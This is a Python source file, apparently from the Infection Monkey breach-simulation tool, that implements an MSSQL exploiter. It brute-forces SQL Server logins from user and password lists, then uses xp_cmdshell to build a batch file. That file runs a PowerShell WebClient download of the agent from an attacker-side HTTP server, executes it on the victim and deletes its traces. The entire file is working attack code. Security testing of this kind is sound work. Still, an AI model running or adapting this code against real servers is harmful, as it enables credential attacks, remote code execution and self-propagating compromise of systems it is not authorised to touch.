import logging
import os
from pathlib import PurePath
from time import sleep

import pymssql

from common.common_consts.timeouts import LONG_REQUEST_TIMEOUT
from common.utils.exceptions import FailedExploitationError
from infection_monkey.exploit.HostExploiter import HostExploiter
from infection_monkey.exploit.tools.helpers import get_agent_dest_path
from infection_monkey.exploit.tools.http_tools import HTTPTools
from infection_monkey.exploit.tools.payload_parsing import LimitedSizePayload
from infection_monkey.i_puppet import ExploiterResultData
from infection_monkey.model import DROPPER_ARG
from infection_monkey.transport import LockedHTTPServer
from infection_monkey.utils.brute_force import generate_identity_secret_pairs
from infection_monkey.utils.commands import build_monkey_commandline
from infection_monkey.utils.threading import interruptible_iter

logger = logging.getLogger(__name__)


class MSSQLExploiter(HostExploiter):
    _EXPLOITED_SERVICE = "MSSQL"
    LOGIN_TIMEOUT = LONG_REQUEST_TIMEOUT
    QUERY_TIMEOUT = LONG_REQUEST_TIMEOUT
    # Time in seconds to wait between MSSQL queries.
    QUERY_BUFFER = 0.5
    SQL_DEFAULT_TCP_PORT = "1433"

    # Temporary file that saves commands for monkey's download and execution.
    TMP_FILE_NAME = "tmp_monkey.bat"
    TMP_DIR_PATH = "%temp%\\tmp_monkey_dir"

    MAX_XP_CMDSHELL_COMMAND_SIZE = 128

    XP_CMDSHELL_COMMAND_START = 'xp_cmdshell "'
    XP_CMDSHELL_COMMAND_END = '"'
    EXPLOIT_COMMAND_PREFIX = "<nul set /p="
    EXPLOIT_COMMAND_SUFFIX = ">>{payload_file_path}"
    CREATE_COMMAND_SUFFIX = ">{payload_file_path}"
    MONKEY_DOWNLOAD_COMMAND = (
        "powershell (new-object System.Net.WebClient)."
        "DownloadFile(^'{http_path}^' , ^'{dst_path}^')"
    )

    def __init__(self):
        super().__init__()
        self.cursor = None
        self.agent_http_path = None
        self.payload_file_path = os.path.join(
            MSSQLExploiter.TMP_DIR_PATH, MSSQLExploiter.TMP_FILE_NAME
        )

    def _exploit_host(self) -> ExploiterResultData:
        """
        First this method brute forces to get the mssql connection (cursor).
        Also, don't forget to start_monkey_server() before self.upload_monkey() and
        self.stop_monkey_server() after
        """
        monkey_path_on_victim = get_agent_dest_path(self.host, self.options)

        # Brute force to get connection
        creds = generate_identity_secret_pairs(
            self.options["credentials"]["exploit_user_list"],
            self.options["credentials"]["exploit_password_list"],
        )
        try:
            self.cursor = self.brute_force(self.host.ip_addr, self.SQL_DEFAULT_TCP_PORT, creds)
        except FailedExploitationError:
            logger.info(
                f"Failed brute-forcing of MSSQL server on {self.host},"
                f" no credentials were successful"
            )
            return self.exploit_result

        if self._is_interrupted():
            self._set_interrupted()
            return self.exploit_result

        try:
            # Create dir for payload
            self.create_temp_dir()
            self.create_empty_payload_file()

            http_thread = self.start_monkey_server(monkey_path_on_victim)
            self.upload_monkey(monkey_path_on_victim)
            MSSQLExploiter._stop_monkey_server(http_thread)

            # Clear payload to pass in another command
            self.create_empty_payload_file()

            self.run_monkey(monkey_path_on_victim)

            self.remove_temp_dir()
        except Exception as e:
            error_message = (
                f"An unexpected error occurred when trying "
                f"to exploit MSSQL on host {self.host}: {e}"
            )

            logger.error(error_message)
            self.exploit_result.error_message = error_message

            return self.exploit_result

        self.exploit_result.propagation_success = True
        return self.exploit_result

    def run_payload_file(self):
        file_running_command = MSSQLLimitedSizePayload(self.payload_file_path)
        return self.run_mssql_command(file_running_command)

    def create_temp_dir(self):
        dir_creation_command = MSSQLLimitedSizePayload(
            command="mkdir {}".format(MSSQLExploiter.TMP_DIR_PATH)
        )
        self.run_mssql_command(dir_creation_command)

    def create_empty_payload_file(self):
        suffix = MSSQLExploiter.CREATE_COMMAND_SUFFIX.format(
            payload_file_path=self.payload_file_path
        )
        tmp_file_creation_command = MSSQLLimitedSizePayload(command="NUL", suffix=suffix)
        self.run_mssql_command(tmp_file_creation_command)

    def run_mssql_command(self, mssql_command):
        array_of_commands = mssql_command.split_into_array_of_smaller_payloads()
        if not array_of_commands:
            raise Exception("Couldn't execute MSSQL exploiter because payload was too long")
        self.run_mssql_commands(array_of_commands)

    def run_monkey(self, monkey_path_on_victim: PurePath):
        monkey_launch_command = self.get_monkey_launch_command(monkey_path_on_victim)
        self.run_mssql_command(monkey_launch_command)
        self.run_payload_file()

    def run_mssql_commands(self, cmds):
        for cmd in cmds:
            self.cursor.execute(cmd)
            sleep(MSSQLExploiter.QUERY_BUFFER)

    def upload_monkey(self, monkey_path_on_victim: PurePath):
        monkey_download_command = self.write_download_command_to_payload(monkey_path_on_victim)
        self.run_payload_file()
        self.add_executed_cmd(monkey_download_command.command)

    def remove_temp_dir(self):
        # Remove temporary dir we stored payload at
        tmp_file_removal_command = MSSQLLimitedSizePayload(
            command="del {}".format(self.payload_file_path)
        )
        self.run_mssql_command(tmp_file_removal_command)
        tmp_dir_removal_command = MSSQLLimitedSizePayload(
            command="rmdir {}".format(MSSQLExploiter.TMP_DIR_PATH)
        )
        self.run_mssql_command(tmp_dir_removal_command)

    def start_monkey_server(self, monkey_path_on_victim: PurePath) -> LockedHTTPServer:
        self.agent_http_path, http_thread = HTTPTools.create_locked_transfer(
            self.host, str(monkey_path_on_victim), self.agent_repository
        )
        return http_thread

    @staticmethod
    def _stop_monkey_server(http_thread):
        http_thread.stop()
        http_thread.join(LONG_REQUEST_TIMEOUT)

    def write_download_command_to_payload(self, monkey_path_on_victim: PurePath):
        monkey_download_command = self.get_monkey_download_command(monkey_path_on_victim)
        self.run_mssql_command(monkey_download_command)
        return monkey_download_command

    def get_monkey_launch_command(self, monkey_path_on_victim: PurePath):
        # Form monkey's launch command
        monkey_args = build_monkey_commandline(
            self.host, self.current_depth - 1, monkey_path_on_victim
        )
        suffix = ">>{}".format(self.payload_file_path)
        prefix = MSSQLExploiter.EXPLOIT_COMMAND_PREFIX
        return MSSQLLimitedSizePayload(
            command="{} {} {}".format(monkey_path_on_victim, DROPPER_ARG, monkey_args),
            prefix=prefix,
            suffix=suffix,
        )

    def get_monkey_download_command(self, monkey_path_on_victim: PurePath):
        monkey_download_command = MSSQLExploiter.MONKEY_DOWNLOAD_COMMAND.format(
            http_path=self.agent_http_path, dst_path=str(monkey_path_on_victim)
        )
        prefix = MSSQLExploiter.EXPLOIT_COMMAND_PREFIX
        suffix = MSSQLExploiter.EXPLOIT_COMMAND_SUFFIX.format(
            payload_file_path=self.payload_file_path
        )
        return MSSQLLimitedSizePayload(
            command=monkey_download_command, suffix=suffix, prefix=prefix
        )

    def brute_force(self, host, port, users_passwords_pairs_list):
        """
        Starts the brute force connection attempts and if needed then init the payload process.
        Main loop starts here.

        Args:
            host (str): Host ip address
            port (str): Tcp port that the host listens to
            users_passwords_pairs_list (list): a list of users and passwords pairs to bruteforce
            with

        Return:
            True or False depends if the whole bruteforce and attack process was completed
            successfully or not
        """
        # Main loop
        # Iterates on users list
        credentials_iterator = interruptible_iter(
            users_passwords_pairs_list,
            self.interrupt,
            "MSSQL exploiter has been interrupted",
            logging.INFO,
        )

        for user, password in credentials_iterator:
            try:
                # Core steps
                # Trying to connect
                conn = pymssql.connect(
                    host,
                    user,
                    password,
                    port=port,
                    login_timeout=self.LOGIN_TIMEOUT,
                    timeout=self.QUERY_TIMEOUT,
                )
                logger.info(
                    f"Successfully connected to host: {host} using user: {user} and password"
                )
                self.exploit_result.exploitation_success = True
                self.add_vuln_port(MSSQLExploiter.SQL_DEFAULT_TCP_PORT)
                self.report_login_attempt(True, user, password)
                cursor = conn.cursor()
                return cursor
            except pymssql.OperationalError as err:
                logger.info(f"Connection to MSSQL failed: {err}")
                self.report_login_attempt(False, user, password)
                # Combo didn't work, hopping to the next one
                pass

        logger.warning(
            "No user/password combo was able to connect to host: {0}:{1}, "
            "aborting brute force".format(host, port)
        )
        raise FailedExploitationError(
            "Bruteforce process failed on host: {0}".format(self.host.ip_addr)
        )


class MSSQLLimitedSizePayload(LimitedSizePayload):
    def __init__(self, command, prefix="", suffix=""):
        super(MSSQLLimitedSizePayload, self).__init__(
            command=command,
            max_length=MSSQLExploiter.MAX_XP_CMDSHELL_COMMAND_SIZE,
            prefix=MSSQLExploiter.XP_CMDSHELL_COMMAND_START + prefix,
            suffix=suffix + MSSQLExploiter.XP_CMDSHELL_COMMAND_END,
        )
